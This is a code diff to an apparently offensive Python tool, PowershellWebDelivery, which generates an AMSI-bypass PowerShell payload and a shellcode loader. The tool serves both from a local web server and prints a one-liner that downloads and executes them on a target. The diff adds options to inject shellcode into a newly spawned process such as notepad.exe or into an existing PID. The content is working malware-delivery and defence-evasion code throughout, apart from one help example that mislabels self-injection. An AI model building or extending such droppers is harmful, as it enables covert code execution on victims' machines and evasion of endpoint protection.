@@ -32,7 +32,7 @@ def generateOneLiner(ip, port, scheme="http", amsiPath="payloadAmsi.ps1", shellc
     return oneLiner
 
 
-def generatePayloads(binary, binaryArgs, rawShellCode):
+def generatePayloads(binary, binaryArgs, rawShellCode, spawnProcess, pid):
 
     if binary:
         print('binary ', binary)
@@ -69,8 +69,28 @@ def generatePayloads(binary, binaryArgs, rawShellCode):
     AmsiBypassPath = os.path.join(Path(__file__).parent, "AmsiBypass.template")
     amsiBypass = open(AmsiBypassPath, "rb").read()
 
-    ShellcodeLoaderPath = os.path.join(Path(__file__).parent, "ShellcodeLoader.template")
-    shellCodeLoader = open(ShellcodeLoaderPath, "rb").read()
+    if spawnProcess or pid:
+        ShellcodeLoaderPath = os.path.join(Path(__file__).parent, "ShellcodeLoader.template.remoteInject")
+        shellCodeLoader = open(ShellcodeLoaderPath, "rb").read()
+        
+        print(spawnProcess)
+        print(pid)
+        if spawnProcess:
+                spawnProcessCode = '''
+$proc = Start-Process {} -PassThru
+Start-Sleep -Milliseconds 500
+$procPid = $proc.Id
+        '''.format(spawnProcess)
+                shellCodeLoader = shellCodeLoader.replace(b"PLACE_HOLDER", spawnProcessCode.encode("utf-8"))
+        elif pid:
+                injectPidCode = '''
+$procPid = {}
+        '''.format(str(pid))
+                shellCodeLoader = shellCodeLoader.replace(b"PLACE_HOLDER", injectPidCode.encode("utf-8"))
+
+    else:
+        ShellcodeLoaderPath = os.path.join(Path(__file__).parent, "ShellcodeLoader.template")
+        shellCodeLoader = open(ShellcodeLoaderPath, "rb").read()
 
     # creat AMIS bypass payload
     out = BytesIO()
@@ -92,12 +112,35 @@ def generatePayloads(binary, binaryArgs, rawShellCode):
 
 
 def getHelpExploration():
-        helpMessage = 'PowershellWebDelivery generate a powershell one liner to download and execute a payload from a web server\n'
-        helpMessage += 'Usage:  Dropper PowershellWebDelivery listenerDownload listenerBeacon\n'
+        helpMessage = '''
+PowershellWebDelivery - Generate a PowerShell one-liner to download and execute a payload from a web server.
+
+Usage:  
+  Dropper PowershellWebDelivery listenerDownload listenerBeacon [options]
+  Options:
+  -s, --spawnProcess <name>   Name of a process to spawn and inject into (e.g., notepad.exe).
+  -d, --pid <pid>             PID of an existing process to inject into.
+
+Examples:
+  # Serve and run the shellcode
+  PowershellWebDelivery.py jj jj -s notepad.exe
+
+  # Serve and inject shellcode into a newly spawned process
+  PowershellWebDelivery.py jj jj -s notepad.exe
+
+  # Serve and inject shellcode into a specific process by PID
+  PowershellWebDelivery.py jj jj -d 1234
+
+Notes:
+- The generated PowerShell one-liner will be printed to the console.
+- Use `-s` or `-d`, not both. If neither is provided the shellcode will self inject.
+'''
         return helpMessage
 
 
 def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):
+
+        _ip, _port, _binary, _binaryArgs, _rawShellCode, spawnProcess, pid = parseCmdLine(aditionalArgs)
 
         if url[-1:] == "/":
                 url = url[:-1]
@@ -111,11 +154,16 @@ def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditional
         print(" Schema:", schema)
         print(" IP Address:", ip)
         print(" Port:", port)
+        print(" binary:", binary)
+        print(" binaryArgs:", binaryArgs)
+        print(" rawShellCode:", rawShellCode)
+        print(" spawnProcess:", spawnProcess)
+        print(" pid:", pid)
 
         # Generate payloads
         droppersPath = []
         shellcodesPath = []
-        amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode)
+        amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode, spawnProcess, pid)
 
         filenameAmsi = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
         amsiOneLinerPath = os.path.join(Path(__file__).parent, 'bin')
@@ -150,66 +198,109 @@ def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditional
         return droppersPath, shellcodesPath, oneliner
 
 
-helpMessage = 'PowershellWebDelivery generate a powershell one liner to download and execute a payload from a web server\n'
-helpMessage += 'Usage:  Dropper PowershellWebDelivery listenerDownload listenerBeacon\n'
-helpMessage += 'Exemple:\n'
-helpMessage += 'PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"'
-helpMessage += 'PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./met.raw'
+helpMessage = '''
+PowershellWebDelivery - Generate a PowerShell one-liner to download and execute a payload from a web server.
+
+Usage:
+  PowershellWebDelivery.py -i <ip> -p <port> [options]
+
+Options:
+  -i, --ip <ip>               IP address or hostname of the server hosting the payload.
+  -p, --port <port>           Port number to serve the payload.
+  -b, --binary <path>         Path to the binary to serve and execute (e.g., ./calc.exe).
+  -a, --args "<args>"         Optional arguments to pass to the binary upon execution.
+  -r, --raw <path>            Path to raw shellcode (.raw file) to inject instead of a binary.
+  -s, --spawnProcess <name>   Name of a process to spawn and inject into (e.g., notepad.exe).
+  -d, --pid <pid>             PID of an existing process to inject into.
+  -h                          Show this help message and exit.
+
+Examples:
+  # Serve and execute calc.exe with no arguments
+  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe
+
+  # Serve and execute calc.exe with arguments
+  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "-winmode hide"
+
+  # Serve and inject raw shellcode into a newly spawned process
+  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./payload.raw -s notepad.exe
+
+  # Serve and inject raw shellcode into a specific process by PID
+  PowershellWebDelivery.py -i 127.0.0.1 -p 8000 -r ./payload.raw -d 1234
+
+Notes:
+- The generated PowerShell one-liner will be printed to the console.
+- Ensure the payload can be downloaded and executed on the target.
+- Use `-b` or `-r`, not both.
+- Use `-s` or `-d`, not both. If neither is provided the shellcode will self inject.
+'''
+
+
+def parseCmdLine(argv):
+        
+        ip=""
+        port=""
+        binary=""
+        binaryArgs=""
+        rawShellCode=""
+        spawnProcess=""
+        pid=""
+
+        opts, args = getopt.getopt(argv,"hi:p:b:a:r:s:d:",["ip=","port=","binary=","args=","raw=","spawnProcess=","pid="])
+        for opt, arg in opts:
+                if opt == '-h':
+                        print(helpMessage)
+                        sys.exit()
+                elif opt in ("-b", "--binary"):
+                        binary = arg
+                elif opt in ("-a", "--args"):
+                        binaryArgs = arg
+                elif opt in ("-i", "--ip"):
+                        ip = arg
+                elif opt in ("-p", "--port"):
+                        port = arg
+                elif opt in ("-r", "--raw"):
+                        rawShellCode = arg
+                elif opt in ("-s", "--spawnProcess"):
+                        spawnProcess = arg
+                elif opt in ("-d", "--pid"):
+                        pid = arg
+
+        return ip, port, binary, binaryArgs, rawShellCode, spawnProcess, pid
 
 
 def main(argv):
-    if(len(argv)<6):
-            print(helpMessage)
-            exit()
+        if(len(argv)<6):
+                print(helpMessage)
+                exit()
 
-    ip=""
-    port=""
-    binary=""
-    binaryArgs=""
-    rawShellCode=""
+        ip, port, binary, binaryArgs, rawShellCode, spawnProcess, pid = parseCmdLine(argv)
+        
+        print('[+] Generate dropper for params:')
+        print('ip ', ip)
+        print('port ', port)
 
-    opts, args = getopt.getopt(argv,"hi:p:b:a:r:",["ip=","port=","binary=","args=","raw="])
-    for opt, arg in opts:
-            if opt == '-h':
-                    print(helpMessage)
-                    sys.exit()
-            elif opt in ("-b", "--binary"):
-                    binary = arg
-            elif opt in ("-a", "--args"):
-                    binaryArgs = arg
-            elif opt in ("-i", "--ip"):
-                    ip = arg
-            elif opt in ("-p", "--port"):
-                    port = arg
-            elif opt in ("-r", "--raw"):
-                    rawShellCode = arg
-    
-    print('[+] Generate dropper for params:')
-    print('ip ', ip)
-    print('port ', port)
+        amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode, spawnProcess, pid)
 
-    amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode)
+        payloadAmsiPath = os.path.join(Path(__file__).parent, "./web/payloadAmsi.ps1")
+        f1 = open(payloadAmsiPath, "w")
+        f1.write(amsiOneLiner)
+        f1.close()
 
-    payloadAmsiPath = os.path.join(Path(__file__).parent, "./web/payloadAmsi.ps1")
-    f1 = open(payloadAmsiPath, "w")
-    f1.write(amsiOneLiner)
-    f1.close()
+        payloadShellcodePath = os.path.join(Path(__file__).parent, "./web/payloadShellcode.ps1")
+        f2 = open(payloadShellcodePath, "w")
+        f2.write(shellcodeLoaderOneliner)
+        f2.close()
 
-    payloadShellcodePath = os.path.join(Path(__file__).parent, "./web/payloadShellcode.ps1")
-    f2 = open(payloadShellcodePath, "w")
-    f2.write(shellcodeLoaderOneliner)
-    f2.close()
+        oneliner = generateOneLiner(ip, port, scheme="http", amsiPath="/payloadAmsi.ps1", shellcodeLoaderPath="/payloadShellcode.ps1")
 
-    oneliner = generateOneLiner(ip, port, scheme="http", amsiPath="/payloadAmsi.ps1", shellcodeLoaderPath="/payloadShellcode.ps1")
-
-    print(oneliner)
-    
-    print("[+] Web delivery on web server {} : {}".format(ip, port))
-    os.chdir("./web")
-    httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
-    httpd.serve_forever()
+        print(oneliner)
+        
+        print("[+] Web delivery on web server {} : {}".format(ip, port))
+        os.chdir("./web")
+        httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
+        httpd.serve_forever()
 
 
 if __name__ == "__main__":
-    main(sys.argv[1:])
+        main(sys.argv[1:])
 
